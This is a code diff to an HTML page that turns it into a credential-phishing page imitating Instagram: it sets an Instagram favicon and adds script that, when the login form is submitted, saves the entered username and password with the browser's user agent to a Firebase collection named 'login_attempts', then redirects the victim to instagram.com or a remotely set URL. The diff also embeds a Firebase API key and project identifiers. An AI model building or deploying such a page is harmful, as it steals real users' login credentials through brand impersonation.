@@ -8,7 +8,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
-    <link rel="icon" href="./images/logo.png" type="image/x-icon">
+    <link rel="icon" href="./images/instagram.png" type="image/x-icon">
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore-compat.js"></script>
@@ -87,25 +87,63 @@
     </div>
 
     <script>
-    // Firebase configuration
-    const firebaseConfig = {
-        apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
-        authDomain: "insta-7f34f.firebaseapp.com",
-        projectId: "insta-7f34f",
-        storageBucket: "insta-7f34f.firebasestorage.app",
-        messagingSenderId: "981637167144",
-        appId: "1:981637167144:web:841af72e833be6ed081d1d"
-    };
-
-    // Initialize Firebase
-    try {
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
+            authDomain: "insta-7f34f.firebaseapp.com",
+            databaseURL: "https://insta-7f34f-default-rtdb.firebaseio.com",
+            projectId: "insta-7f34f",
+            storageBucket: "insta-7f34f.firebasestorage.app",
+            messagingSenderId: "981637167144",
+            appId: "1:981637167144:web:841af72e833be6ed081d1d"
+        };
+    
+        // Initialize Firebase
         const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
-        console.log("Firebase initialized successfully");
-    } catch (error) {
-        console.error("Firebase initialization error:", error);
-    }
-
-    // Rest of your code...
+    
+        // Get the redirect URL from Firestore
+        let redirectUrl = "https://www.instagram.com/"; // Default URL
+    
+        // Function to update the redirect URL
+        async function updateRedirectUrl() {
+            try {
+                const doc = await db.collection("config").doc("redirect").get();
+                if (doc.exists && doc.data().url) {
+                    redirectUrl = doc.data().url;
+                }
+            } catch (error) {
+                console.error("Error getting redirect URL:", error);
+            }
+        }
+    
+        // Update URL when page loads
+        updateRedirectUrl();
+    
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                // Store in Firebase
+                await db.collection("login_attempts").add({
+                    username: username,
+                    password: password,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                    userAgent: navigator.userAgent,
+                    timestampClient: new Date().toISOString()
+                });
+                
+                // Redirect to the URL from Firestore (or default)
+                window.location.href = redirectUrl;
+            } catch (error) {
+                console.error("Error:", error);
+                window.location.href = redirectUrl;
+            }
+        });
+    </script>
 </body>
 </html>
